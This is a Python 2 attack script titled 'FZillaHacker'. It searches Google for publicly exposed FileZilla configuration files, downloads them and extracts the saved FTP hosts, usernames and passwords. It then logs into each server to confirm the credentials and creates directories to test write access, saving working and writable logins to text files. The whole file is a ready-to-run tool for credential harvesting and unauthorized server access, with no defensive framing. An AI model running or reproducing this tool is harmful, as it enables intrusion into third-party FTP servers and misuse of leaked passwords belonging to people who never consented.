import xml.etree.ElementTree as ET
from ftplib import FTP
import random
import urllib2,re
import thread

headder={'User-Agent':'Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1'}

def checklogin(host,user,passwd):
  try:
    con=FTP(host,user,passwd)
#		con.mkd(str(int(random.random()*10000)))
    return 1
  except:
    return 0

def checkwrite(host,user,passwd):
  try:
    con=FTP(host,user,passwd)
    con.mkd('rand%s' % str(int(random.random()*100000)))
    return 1
  except:
    return 0

def process_xml(txt):
  try:
    root=ET.fromstring(txt)
    serverlist=root.find('Servers').findall('Server')
    for s in serverlist:
      try:
        host=s.find('Host').text
        user=s.find('User').text
        passwd=s.find('Pass').text
        
        print "[-] Trying %s %s %s"% (host,user,passwd)
        
        if checklogin(host,user,passwd):
          login = host+"  "+user+"  "+passwd
          print '\n[+] Found:  %s\n' % login
          fwrite(login,'passlist.txt')
      except Exception,e:
        pass
  except Exception, e:
    pass
    # print "[X]  XML Parse Error : ",e

def fwrite(contenturl,fname):
  try:
    ipfile=open(fname,'r')
    fc=ipfile.read()
    ipfile.close()
  except:
    fc=''
  if not (contenturl in fc):
    opfile=open(fname,'a+')
    opfile.write(contenturl+'\n')
    opfile.close()
    return 0
  else:
    return 1

def main_from_web(execute):
  for i in range(0,1000,10):
    url="http://www.google.co.in/search?q=inurl:filezilla.xml+MODE_DEFAULT&start=%d"% i
    req=urllib2.Request(url,headers=headder)
    s=urllib2.urlopen(req).read()
    
    res=re.findall('(u=)([\w:/.?&;=\-+]+)(&amp;q=)',s)
    for i in res:
      contenturl= i[1]
      if re.match('.+\.xml',contenturl,re.I):
        exists=fwrite(contenturl,'fzillalist.txt')
        if execute:
          if not exists:
            try:
              content=urllib2.urlopen(contenturl).read()
              thread.start_new_thread(process_xml,(content,))
            except Exception, e:
              print "[x] Error : %s "% contenturl,e
        else:
          print '[+] %s' % contenturl

def main_from_file():
  ipfile=open('fzillalist.txt')
  xmllist=ipfile.read()
  xmllist=xmllist.split()
  for xmlfile in xmllist:
    try:
      xmlcontent=urllib2.urlopen(xmlfile).read()
      thread.start_new_thread(process_xml,(xmlcontent,))
    except Exception,e:
      print "[x] Error %s : " % xmlfile,e

def main_check_write():
  logins=open('passlist.txt').read().trim().split('\n')
  for login in logins:
    fields=login.split()
    if checkwrite(fields[0],fields[1],fields[2]):
      print '[+]',fields
      fwrite("%s %s %s"%(fields[0],fields[1],fields[2]),'writelist.txt')
    else:
      print '[-]',fields
 
if __name__=='__main__':
  print """
  __________________FZillaHacker____________________
  
  Enter your option.
  
      1. Load and Run from Google.
      2. Load and Run from File (Must be followed by Step 3).
      3. Make a list of filezilla.xml urls from web.
      4. Check writable from login list.
      5. Exit
      
      """
  opt=int(raw_input(": "))
  if opt==1:
    main_from_web(1)
  elif opt==2:
    main_from_file()
  elif opt==3:
    main_from_web(0)
  elif opt==4:
    main_check_write()
   